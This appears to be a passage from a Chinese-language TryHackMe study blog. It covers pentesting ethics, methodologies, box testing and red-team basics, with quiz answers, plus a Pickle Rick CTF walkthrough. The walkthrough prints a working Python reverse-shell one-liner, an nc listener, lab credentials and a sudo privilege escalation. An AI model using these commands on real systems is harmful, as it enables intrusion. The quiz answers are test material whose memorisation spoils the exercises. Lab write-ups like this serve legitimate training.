<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在教授您道德黑客的技术操作方面之前，您需要更多了解渗透测试人员的工作职责以及执行渗透测试（发现客户应用程序或系统中的漏洞）的过程。</span><br><span class="line">网络安全的重要性和相关性不断增加，并且可以在生活的各个方面体现。新闻标题充斥着我们的屏幕，报道又一次的黑客攻击或数据泄漏事件。</span><br><span class="line"></span><br><span class="line">网络安全对现代世界的所有人都是相关的，包括建立强密码政策以保护您的电子邮件，或是对企业和其他组织来说，需要保护设备和数据免受损害。</span><br><span class="line"></span><br><span class="line">渗透测试或pentest是一种在道德框架下进行的尝试，旨在测试和分析保护这些资产和信息的安全防御措施。渗透测试涉及使用与具有恶意意图的人相同的工具、技术和方法，并类似于审计。</span><br><span class="line"></span><br><span class="line">据《Security Magazine》（一家网络安全行业杂志）称，每天有超过2200次网络攻击- 每39秒发生一次攻击。</span><br></pre></td></tr></table></figure>
<h3 id="Penetration-Testing-Ethics">Penetration Testing Ethics</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在网络安全领域，尤其是渗透测试中，合法性和道德常常备受争议。标签如“黑客”和“骇客”在流行文化中往往带有负面含义，这要归功于一小部分不法分子。合法地获取对计算机系统的访问权是一个难以理解的概念 —— 毕竟，到底什么才算是合法的呢？</span><br><span class="line"></span><br><span class="line">回想一下，渗透测试是系统所有者同意的对计算机系统安全和防御的授权审计。在这个意义上，渗透测试的合法性是十分明确的；任何超出此协议范围的行为都被视为未经授权。</span><br><span class="line"></span><br><span class="line">在渗透测试开始之前，渗透测试人员与系统所有者进行正式讨论。他们就要测试的各种工具、技术和系统达成一致。这些讨论形成了渗透测试协议的范围，并将决定渗透测试的进行方式。</span><br><span class="line"></span><br><span class="line">提供渗透测试服务的公司受到法律框架和行业认证的约束。例如，在英国，国家网络安全中心（NCSC）设有CHECK认证计划。这个认证意味着只有“[CHECK]认可的公司才能对公共部门和关键基础设施的系统和网络进行授权的渗透测试。”（NCSC）</span><br><span class="line"></span><br><span class="line">道德是关于对错的道德辩论；在一个行为可能是合法的情况下，它可能会违背个人的道德信仰系统，即对错之间的选择。</span><br><span class="line"></span><br><span class="line">在渗透测试期间，渗透测试人员经常面临潜在的道德问题。例如，他们可能获得了对数据库的访问权，并面临可能敏感数据的获取。或者，他们可能正在对一个员工进行网络钓鱼攻击，以测试组织的人为安全性。如果这个行为在初始阶段得到了同意，那么它是合法的 —— 然而在道德上具有疑问。</span><br><span class="line"></span><br><span class="line">黑客被分为三类，他们的道德和行为动机决定了他们所处的黑客类型。让我们在下表中介绍这三类：</span><br><span class="line"></span><br><span class="line">黑客类型	描述	示例</span><br><span class="line">白帽黑客	这些黑客被认为是“好人”。他们遵守法律，利用自己的技能造福他人。	例如，一名在公司进行授权测试的渗透测试人员。</span><br><span class="line">灰帽黑客	这些人利用自己的技能来造福他人，然而，他们并不始终遵守法律或道德标准。	例如，某人关闭一个欺诈网站。</span><br><span class="line">黑帽黑客	这些人是罪犯，通常试图破坏组织或以牺牲他人为代价获得某种形式的经济利益。	例如，勒索软件作者通过恶意代码感染设备，并以数据作为赎金。</span><br><span class="line"></span><br><span class="line">战斗规则（ROE）</span><br><span class="line"></span><br><span class="line">ROE是渗透测试任务开始时制定的文件。这个文件由三个主要部分组成（在下表中解释），最终负责决定任务的进行方式。SANS学院在网上提供了这个文件的一个很好的例子，您可以在这里查看。</span><br><span class="line"></span><br><span class="line">部分	描述</span><br><span class="line">权限	这部分文件明确允许任务的进行。这一授权对于法律上保护个人和组织进行的活动至关重要。</span><br><span class="line">测试范围	这部分文件将标注具体的目标，适用于任务的范围。例如，渗透测试可能仅适用于特定的服务器或应用程序，而不是整个网络。</span><br><span class="line">规则	规则部分将定义任务期间允许的具体技术。例如，规则可能明确规定诸如网络钓鱼攻击之类的技术是被禁止的，但中间人攻击是可以的。</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>You are given permission to perform a security audit on an organisation; what type of hacker would you be?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">White Hat</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>You attack an organisation and steal their data, what type of hacker would you be?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Black Hat</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What document defines how a penetration testing engagement should be carried out?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rules of Engagement</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Penetration-Testing-Methodologies">Penetration Testing Methodologies</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">渗透测试可以有多种不同的目标和范围。由于这一点，没有两个渗透测试是相同的，也没有一套方法适用于所有情况。</span><br><span class="line"></span><br><span class="line">渗透测试人员在执行任务时采取的步骤称为方法论。一个实用的方法论是明智的，其中采取的步骤与手头的情况相关。例如，在测试网络安全性时使用的方法论在测试网络安全性时并不实用。</span><br><span class="line"></span><br><span class="line">在讨论一些不同的行业标准方法论之前，我们应该注意，所有这些方法都有以下阶段的一般主题：</span><br><span class="line"></span><br><span class="line">阶段	描述</span><br><span class="line">信息收集	这个阶段涉及尽可能收集有关目标/组织的所有公开可访问信息，例如OSINT和研究。</span><br><span class="line"></span><br><span class="line">注意：这不涉及扫描任何系统。</span><br><span class="line">枚举/扫描	这个阶段涉及发现系统上运行的应用程序和服务。例如，发现一个可能存在漏洞的Web服务器。</span><br><span class="line">利用	这个阶段涉及利用发现的系统或应用程序中的漏洞。这个阶段可能涉及使用公开的漏洞或利用应用程序逻辑。</span><br><span class="line">权限提升	一旦成功利用了系统或应用程序（称为立足点），这个阶段就是试图扩展对系统的访问。您可以横向和纵向提升权限，横向是访问同一权限组的另一个帐户（例如，另一个用户），而纵向是访问另一个权限组的帐户（例如，管理员）。</span><br><span class="line">后渗透	这个阶段涉及几个子阶段：</span><br><span class="line"></span><br><span class="line">1. 可以针对哪些其他主机（枢轴）</span><br><span class="line"></span><br><span class="line">2. 由于我们是特权用户，我们可以从主机中获取哪些附加信息</span><br><span class="line"></span><br><span class="line">3.  遮掩你的踪迹</span><br><span class="line"></span><br><span class="line">4. 报告</span><br><span class="line"></span><br><span class="line">OSSTMM</span><br><span class="line"></span><br><span class="line">开放源安全测试方法手册为系统、软件、应用程序、通信和网络安全的测试策略提供了详细的框架。</span><br><span class="line"></span><br><span class="line">该方法主要关注这些系统、应用程序的通信方式，因此包括了：</span><br><span class="line"></span><br><span class="line">电信（电话、VoIP等）</span><br><span class="line">有线网络</span><br><span class="line">无线通信</span><br><span class="line">优点	缺点</span><br><span class="line">深入涵盖了各种测试策略。</span><br><span class="line">该框架难以理解，非常详细，并倾向于使用独特的定义。</span><br><span class="line">包括特定目标的测试策略（例如，电信和网络）</span><br><span class="line">故意留空。</span><br><span class="line">该框架根据组织的需求具有灵活性。</span><br><span class="line">故意留空。</span><br><span class="line">该框架旨在为系统和应用程序建立标准，这意味着可以在渗透测试场景中使用通用方法。</span><br><span class="line">故意留空。</span><br><span class="line"></span><br><span class="line">OWASP</span><br><span class="line"></span><br><span class="line">“开放式Web应用程序安全项目”框架是一个社区驱动且经常更新的框架，专门用于测试Web应用程序和服务的安全性。</span><br><span class="line"></span><br><span class="line">该基金会定期撰写报告，说明Web应用程序可能存在的十大安全漏洞，测试方法和纠正措施。</span><br><span class="line"></span><br><span class="line">优点	缺点</span><br><span class="line">易于学习和理解。	可能不清楚Web应用程序具有哪种类型的漏洞（它们通常会重叠）。</span><br><span class="line">积极维护并经常更新。</span><br><span class="line">OWASP不会建议任何特定的软件开发生命周期。</span><br><span class="line">涵盖了从测试到报告和纠正的所有阶段。</span><br><span class="line">该框架不具备任何类似CHECK的认证。</span><br><span class="line">专注于Web应用程序和服务。</span><br><span class="line">故意留空。</span><br><span class="line"></span><br><span class="line">NIST网络安全框架1.1</span><br><span class="line"></span><br><span class="line">NIST网络安全框架是一种流行的框架，用于提高组织的网络安全标准并管理网络威胁的风险。这个框架由于其流行度和详细程度而成为一种值得一提的方法。</span><br><span class="line"></span><br><span class="line">该框架为组织从关键基础设施（发电厂等）到商业的安全控制和成功基准提供了指南。 对渗透测试人员应采取的方法没有一个标准指南。</span><br><span class="line"></span><br><span class="line">优点	缺点</span><br><span class="line">据估计，到2020年，50%的美国组织将使用NIST框架。</span><br><span class="line">NIST有许多不同版本的框架，因此可能难</span><br><span class="line"></span><br><span class="line">以确定哪一个适用于您的组织。</span><br><span class="line">该框架在制定标准方面非常详细，以帮助组织减轻网络威胁带来的威胁。</span><br><span class="line">NIST框架的审计政策较弱，难以确定发生了什么样的违规行为。</span><br><span class="line">该框架经常进行更新。</span><br><span class="line">该框架不考虑云计算，而云计算正在迅速变得越来越受组织欢迎。</span><br><span class="line">NIST为使用该框架的组织提供认证。</span><br><span class="line">故意留空。</span><br><span class="line">NIST框架旨在与其他框架一起实施。</span><br><span class="line">故意留空。</span><br><span class="line"></span><br><span class="line">NCSC CAF</span><br><span class="line"></span><br><span class="line">网络评估框架（CAF）是一个广泛的框架，包含14个原则，用于评估各种网络威胁以及组织对这些威胁的防御。</span><br><span class="line"></span><br><span class="line">该框架适用于被视为执行“至关重要的服务和活动”的组织，如关键基础设施、银行等。该框架主要关注和评估以下主题：</span><br><span class="line"></span><br><span class="line">数据安全</span><br><span class="line">系统安全</span><br><span class="line">身份和访问控制</span><br><span class="line">弹性</span><br><span class="line">监控</span><br><span class="line">响应和恢复规划</span><br><span class="line"></span><br><span class="line">优点	缺点</span><br><span class="line">这个框架得到了政府网络安全机构的支持。</span><br><span class="line">该框架在行业中仍然比较新，这意味着组织还没有足够的时间进行必要的改变以适应它。</span><br><span class="line">这个框架提供认证。</span><br><span class="line">该框架基于原则和思想，不像某些其他框架那样直接。</span><br><span class="line">这个框架涵盖了从安全到响应的十四个原则。</span><br><span class="line">故意留空。</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>What stage of penetration testing involves using publicly available information?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Information Gathering</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>If you wanted to use a framework for pentesting telecommunications, what framework would you use? Note: We’re looking for the acronym here and not the full name.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OSSTMM</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What framework focuses on the testing of web applications?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OWASP</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Black-box-White-box-Grey-box-Penetration-Testing">Black box, White box, Grey box Penetration Testing</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑盒测试</span><br><span class="line">这个测试过程是一个高级过程，测试人员不会获得关于应用程序或服务内部工作原理的任何信息。</span><br><span class="line">测试人员扮演普通用户的角色，测试应用程序或软件的功能和交互。这种测试可能涉及与界面进行交互，即按钮，并测试是否返回了预期的结果。对于这种类型的测试，不需要编程知识或对程序的理解。</span><br><span class="line">黑盒测试显著增加了在信息收集和枚举阶段花费的时间，以了解目标的攻击面。</span><br><span class="line"></span><br><span class="line">灰盒测试</span><br><span class="line">这个测试过程是最受欢迎的用于诸如渗透测试之类的事物。它是黑盒测试和白盒测试过程的结合体。测试人员对应用程序或软件的内部组件具有一些有限的知识，但他们会像黑盒场景一样与应用程序进行交互，然后利用他们对应用程序的了解来解决发现的问题。</span><br><span class="line">在灰盒测试中，提供的有限知识可以节省时间，并且通常被选择用于极为艰难的攻击面。</span><br><span class="line"></span><br><span class="line">白盒测试</span><br><span class="line">这个测试过程是一个低级过程，通常由了解编程和应用程序逻辑的软件开发人员执行。测试人员将测试应用程序或软件的内部组件，并确保特定功能能够正确地工作且在合理的时间内完成。</span><br><span class="line">测试人员将完全了解应用程序及其预期行为，并且比黑盒测试要耗费更多时间。在白盒测试场景中的完全了解提供了一种测试方法，可以验证整个攻击面。</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>You are asked to test an application but are not given access to its source code - what testing process is this?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Black Box</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>You are asked to test a website, and you are given access to the source code - what testing process is this?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">White Box</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Practical-ACME-Penetration-Test">Practical: ACME Penetration Test</h3>
<p>简单呈现了一个渗透测试的基础过程</p>
<h2 id="Pickle-Rick">Pickle Rick</h2>
<h3 id="前言">前言</h3>
<p>一个简单靶场，kali环境有些小问题，这次是windows下做的</p>
<p>A Rick and Morty CTF. Help turn Rick back into a human!</p>
<h3 id="过程">过程</h3>
<p>首先给出一个页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Listen Morty... I need your help, I&#x27;ve turned myself into a pickle again and this time I can&#x27;t change back!</span><br><span class="line"></span><br><span class="line">I need you to *BURRRP*....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the *BURRRRRRRRP*, password was! Help Morty, Help!</span><br></pre></td></tr></table></figure>
<p>很明显提示说使用burpsuite</p>
<p>通过抓包得到一条提示信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Note to self, remember username!</span><br><span class="line">Username: R1ckRul3s</span><br></pre></td></tr></table></figure>
<p>先使用扫描存在的端口，发现存在了两个开放端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024/2/23 23:27:09    开始扫描...</span><br><span class="line">10.10.242.108:22</span><br><span class="line">10.10.242.108:80</span><br></pre></td></tr></table></figure>
<p>然后来扫一下目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login.php</span><br><span class="line">robots.txt</span><br></pre></td></tr></table></figure>
<p>在robots.txt下发现存在字符串，当作密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Wubbalubbadubdub</span><br></pre></td></tr></table></figure>
<p>login.php尝试登录，登陆后成功跳转portal.php</p>
<p>存在一个可能是命令执行的窗口，ls后查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sup3rS3cretPickl3Ingred.txt</span><br><span class="line">assets</span><br><span class="line">clue.txt</span><br><span class="line">denied.php</span><br><span class="line">index.html</span><br><span class="line">login.php</span><br><span class="line">portal.php</span><br><span class="line">robots.txt</span><br></pre></td></tr></table></figure>
<p>访问Sup3rS3cretPickl3Ingred.txt，得到第一个flag</p>
<p>在clue.txt发现一段话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Look around the file system for the other ingredient.</span><br></pre></td></tr></table></figure>
<p>denied.php禁止访问</p>
<p>开始反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.8.71.162 &quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1234</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/25/RbVJ34EyWQNHPaT.png" alt=""></p>
<p>成功反弹后进行提权操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p>发现当前甚至没有设置基础密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for www-data on ip-10-10-242-108.eu-west-1.compute.internal:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on ip-10-10-242-108.eu-west-1.compute.internal:</span><br><span class="line">    (ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
<p>成功提权</p>
<p>然后查找相应的两个flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &quot;second ingredients&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/25/tmTeXNpjWKaqfEy.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ./3rd.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/02/25/H7wTqBGDkIljEb8.png" alt=""></p>
]]></content>
      <categories>
        <category>Tryhackme</category>
      </categories>
      <tags>
        <tag>Tryhackme</tag>
      </tags>
  </entry>
  <entry>
    <title>Tryhackme_Diary-4</title>
    <url>/2024/02/27/Tryhackme_Diary-4/</url>
    <content><![CDATA[<h1>Tryhackme_Diary-4</h1>
<h2 id="Red-Team-Fundamentals">Red Team Fundamentals</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">红队基础</span><br><span class="line">学习红队参与的核心组成部分，从威胁情报到OPSEC和C2s。</span><br><span class="line">本模块将介绍红队参与的核心组成部分和结构。您将学习如何将威胁情报应用于红队参与，利用运营安全流程，并设置自己的命令和控制服务器。到本模块结束时，您将能够规划一项红队参与，并了解用于模拟真实威胁行为者的方法论。</span><br></pre></td></tr></table></figure>
<h3 id="Introduction">Introduction</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网络安全是白帽黑客和黑帽黑客之间不断竞争的过程。随着网络世界中的威胁不断演变，企业对更专业化的服务的需求也在增加，这些服务可以让它们尽可能地准备应对真实攻击。</span><br><span class="line"></span><br><span class="line">尽管传统的安全参与形式，如漏洞评估和渗透测试，可以提供对公司技术安全状况的出色概述，但它们可能忽略了一些真正攻击者可以利用的其他方面。从这个意义上说，我们可以说传统的渗透测试擅长显示漏洞，以便您可以采取积极的措施，但可能无法教您如何应对来自有动机的对手的实际正在进行的攻击。</span><br></pre></td></tr></table></figure>
<h3 id="Vulnerability-Assessment-and-Penetration-Tests-Limitations">Vulnerability Assessment and Penetration Tests Limitations</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏洞评估</span><br><span class="line"></span><br><span class="line">这是安全评估的最简单形式，其主要目标是在网络中尽可能多地识别尽可能多的系统漏洞。为了达到这个目标，可能需要做出让步。例如，攻击者的计算机可能会被允许列入可用安全解决方案的白名单，以避免干扰漏洞发现过程。这是有道理的，因为目标是查看网络上的每个主机，并单独评估其安全状况，同时向公司提供有关在哪里集中进行补救工作的最多信息。</span><br><span class="line"></span><br><span class="line">总之，漏洞评估侧重于扫描主机的漏洞，以便能够识别安全缺陷并以优先方式部署有效的安全措施来保护网络。大部分工作可以通过自动化工具完成，并由操作员执行，而无需太多的技术知识。</span><br><span class="line"></span><br><span class="line">例如，如果您要对网络进行漏洞评估，通常会尝试尽可能多地扫描主机，但实际上不会尝试利用任何漏洞：</span><br><span class="line"></span><br><span class="line">渗透测试</span><br><span class="line">除了为每个单独的主机扫描漏洞外，我们经常需要了解它们对整个网络的影响。渗透测试通过允许渗透测试人员执行额外步骤来增加对漏洞评估的补充，从而进一步完善了漏洞评估，这些额外步骤包括：</span><br><span class="line"></span><br><span class="line">尝试利用在每个系统上发现的漏洞。这很重要，因为有时候系统可能存在漏洞，但有效的补偿控制可以有效阻止其被利用。它还允许我们测试是否可以使用检测到的漏洞来 compromise 给定的主机。</span><br><span class="line">对任何受到攻击的主机执行后渗透任务，以便我们找出是否可以从中提取任何有用信息，或者我们是否可以使用它们来转移到以前无法从我们所处位置访问的其他主机。</span><br><span class="line">渗透测试可能会像普通的漏洞评估一样开始，但提供了更多信息，说明攻击者如何将漏洞链接起来以实现特定目标。虽然其重点仍然是识别漏洞并建立措施以保护网络，但它也考虑了网络作为一个整体生态系统以及攻击者如何从其组件之间的交互中获利的方式。</span><br><span class="line"></span><br><span class="line">如果我们要对同样的示例网络执行渗透测试，除了为网络上的所有主机扫描漏洞外，我们还将尝试确认它们是否可以被利用，以显示攻击者对网络的影响：</span><br><span class="line"></span><br><span class="line">通过分析攻击者如何在我们的网络中移动，我们还可以对可能的安全措施绕过和我们对真实威胁行为的检测能力有一个基本了解，这在一定程度上受到限制，因为渗透测试的范围通常是广泛的，渗透测试人员并不太在乎是否嘈杂或是否在安全设备上生成大量警报，因为这类项目的时间限制通常要求我们在短时间内检查网络。</span><br><span class="line"></span><br><span class="line">高级持续性威胁及常规渗透测试不足之处</span><br><span class="line">尽管我们提到的传统安全参与方式涵盖了大多数技术漏洞的发现，但这些过程及其有效准备公司应对真实攻击的程度存在限制。此类限制包括：</span><br><span class="line"></span><br><span class="line">因此，渗透测试的某些方面可能与真实攻击有很大不同，例如：</span><br><span class="line"></span><br><span class="line">渗透测试很吵闹：通常，渗透测试人员不会花太多精力试图保持不被发现。与真实攻击者不同，他们不介意被轻松发现，因为他们已经受雇于尽可能多地发现尽可能多的漏洞。</span><br><span class="line">可能忽略非技术攻击向量：基于社会工程或物理入侵的攻击通常不包括在测试范围内。</span><br><span class="line">安全机制的放松：在进行常规渗透测试时，出于效率考虑，可能会暂时禁用或放宽某些安全机制以使渗透测试团队受益。尽管这听起来可能有些违反直觉，但重要的是要记住，渗透测试人员在检查网络时时间有限。</span><br><span class="line"></span><br><span class="line">因此，通常不希望浪费他们的时间寻找绕过 IDS/IPS、WAF、入侵欺骗或其他安全措施的新奇方法，而是集中于审查关键的技术基础设施以发现漏洞。</span><br><span class="line">另一方面，真正的攻击者不会遵循道德准则，他们的行动基本上没有限制。如今，最显着的威胁行为者被称为高级持续性威胁（APT），他们通常是由国家或有组织的犯罪集团资助的高技能攻击者组。他们主要针对关键基础设施、金融机构和政府机构。之所以称为持续性，是因为这些组织的操作可以在受感染的网络上长时间不被检测到。</span><br><span class="line"></span><br><span class="line">如果一家公司受到高级持续性威胁的影响，它是否能够有效应对？他们是否能够检测到用于获取和维持对其网络访问的方法，如果攻击者在那里停留了几个月？如果初始访问是因为会计部的约翰打开了一个可疑的电子邮件附件会怎样？如果涉及到零日漏洞利用会怎样？以前的渗透测试是否为此做好了准备？</span><br><span class="line"></span><br><span class="line">为了提供更真实的安全方法，红队参与应运而生。</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>Would vulnerability assessments prepare us to <strong>detect</strong> a real attacker on our networks? (Yay/Nay)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nay</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>During a penetration test, are you concerned about being detected by the client? (Yay/Nay)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nay</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Highly organised groups of skilled attackers are nowadays referred to as …</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Advanced Persistent Threats</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Red-Team-Engagements">Red Team Engagements</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为了跟上不断出现的威胁，红队参与被设计成一种过程，将焦点从常规的渗透测试转移到允许我们清楚地看到我们防御团队在检测和响应真实威胁行为方面的能力上。它们并不取代传统的渗透测试，而是通过专注于检测和响应而不是预防来补充它们。</span><br><span class="line"></span><br><span class="line">红队起源于军事领域。在军事演习中，一个团队会扮演红队的角色，模拟攻击技术，以测试防御团队（通常称为蓝队）对已知对手策略的反应能力。在网络安全领域，红队参与包括模拟真实威胁行为者的战术、技术和程序（TTPs），以便我们可以衡量我们的蓝队对它们的反应，并最终改进任何已经存在的安全控制。</span><br><span class="line"></span><br><span class="line">每个红队参与都将从定义清晰的目标开始，通常称为王冠上的珠宝或旗帜，从入侵给定的关键主机到从目标处窃取一些敏感信息。通常，为了避免在分析中引入任何偏见，蓝队不会被告知此类练习。红队将尽一切努力实现目标，同时保持未被检测到并规避任何现有的安全机制，如防火墙、防病毒软件、EDR、IPS等。请注意，在红队参与中，并不会对网络上的所有主机进行漏洞检测。真正的攻击者只需要找到通往其目标的一个路径，而不关心进行的嘈杂扫描是否会被蓝队检测到。</span><br><span class="line"></span><br><span class="line">以前相同的网络为例，在一个旨在破坏内部服务器的红队参与中，我们会计划一种方法来达到我们的目标，同时尽可能少地与其他主机进行交互。与此同时，可以评估蓝队对攻击的检测能力和相应反应：</span><br><span class="line"></span><br><span class="line">重要的是要注意，这类练习的最终目标绝不应该是让红队“击败”蓝队，而是模拟足够的TTPs，以便蓝队学会对真正正在进行的威胁做出适当的反应。如果需要，他们可以调整或添加安全控制，以帮助提高他们的检测能力。</span><br><span class="line"></span><br><span class="line">红队参与通过考虑几个攻击面改进了常规的渗透测试：</span><br><span class="line"></span><br><span class="line">技术基础设施：与常规的渗透测试一样，红队将尝试揭示技术漏洞，但更加注重隐蔽性和规避性。</span><br><span class="line">社会工程：通过钓鱼活动、电话呼叫或社交媒体来针对人员，以欺骗他们透露本应保密的信息。</span><br><span class="line">物理入侵：使用技术，如撬锁、RFID克隆、利用电子门禁设备中的弱点来访问设施的受限区域。</span><br><span class="line">根据可用资源，红队练习可以以几种方式进行：</span><br><span class="line"></span><br><span class="line">全面参与：模拟攻击者的完整工作流程，从最初的妥协到最终的目标实现。</span><br><span class="line">假定受损：假设攻击者已经控制了一些资产，并尝试从那里实现目标。例如，红队可以获得对某些用户凭证甚至是内部网络中的工作站的访问权限。</span><br><span class="line">桌面演练：红队和蓝队之间讨论场景的桌面模拟，以评估他们如何理论上对某些威胁做出反应。适用于进行实时模拟可能会复杂化的情况。</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>The goals of a red team engagement will often be referred to as flags or…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crown jewels</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>During a red team engagement, common methods used by attackers are emulated against the target. Such methods are usually called TTPs. What does TTP stand for?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tactics, techniques and procedures</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>The main objective of a red team engagement is to detect as many vulnerabilities in as many hosts as possible (Yay/Nay)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nay</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Teams-and-Functions-of-an-Engagement">Teams and Functions of an Engagement</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">红队参与了许多因素和人员。每个人都有自己的心态和方法来对待参与人员，但每次参与都可以分为三个团队或细胞。下面是一个简要的表格，说明了每个团队及其职责的简要解释。</span><br><span class="line"></span><br><span class="line">团队	定义</span><br><span class="line">红细胞	红细胞是红队参与中组成攻击部分的组件，模拟给定目标的战略和战术反应。</span><br><span class="line">蓝细胞	蓝细胞是红队的对立面。它包括了所有防御目标网络的组成部分。蓝细胞通常由蓝队成员、防御者、内部人员和组织管理人员组成。</span><br><span class="line">白细胞	在参与期间充当红细胞活动和蓝细胞响应之间的裁判。控制参与环境/网络。监督遵守 ROE。协调实现参与目标所需的活动。将红细胞活动与防御性行动相关联。确保参与是公正的，不偏向任何一方。</span><br><span class="line">这些团队或细胞可以进一步分解为参与的等级结构。</span><br><span class="line"></span><br><span class="line">由于这是一个以红队为导向的房间，我们将专注于红细胞的职责。下面是一个概述红队成员的角色和职责的表格。</span><br><span class="line"></span><br><span class="line">角色	目的</span><br><span class="line">红队负责人	在高层次上规划和组织参与。分派，助理负责人和操作员的参与任务。</span><br><span class="line">红队助理负责人	协助团队负责人监督参与操作和操作员。如果需要，还可以协助编写参与计划和文档。</span><br><span class="line">红队操作员	执行团队负责人分派的任务。解释和分析团队负责人的参与计划。</span><br><span class="line"></span><br><span class="line">与大多数红队功能一样，每个团队和公司都会为每个团队成员制定自己的结构和角色。上述表格仅作为每个角色典型职责的示例。</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>What cell is responsible for the offensive operations of an engagement?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Red Cell</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What cell is the trusted agent considered part of?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">White Cell</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Engagement-Structure">Engagement Structure</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">红队的一个核心功能是对手仿真。虽然不是强制性的，但通常用于评估真实对手在使用其工具和方法论的环境中会做什么。红队可以使用各种网络攻击链来总结和评估参与活动的步骤和程序。</span><br><span class="line"></span><br><span class="line">蓝队通常使用网络攻击链来映射行为并分解对手的行动。红队可以适应这个想法，将对手的战术、技术和程序(TTPs)映射到参与活动的组件。</span><br><span class="line"></span><br><span class="line">许多监管和标准化机构发布了他们的网络攻击链。每个攻击链大致遵循相同的结构，但有些更深入或定义目标不同。下面是一小部分标准网络攻击链的列表。</span><br><span class="line"></span><br><span class="line">- 洛克希德·马丁网络攻击链</span><br><span class="line">- 统一网络攻击链</span><br><span class="line">- Varonis网络攻击链</span><br><span class="line">- Active Directory攻击周期</span><br><span class="line">- MITRE ATT＆CK框架</span><br><span class="line"></span><br><span class="line">在这个房间里，我们通常会引用“洛克希德·马丁网络攻击链”。它是比其他攻击链更标准化的攻击链，非常常用于红队和蓝队之间。</span><br><span class="line"></span><br><span class="line">洛克希德·马丁攻击链侧重于外部或外部入侵。与其他攻击链不同，它不提供对内部移动的深入分析。您可以将这种攻击链视为所有行为和操作的摘要。</span><br><span class="line"></span><br><span 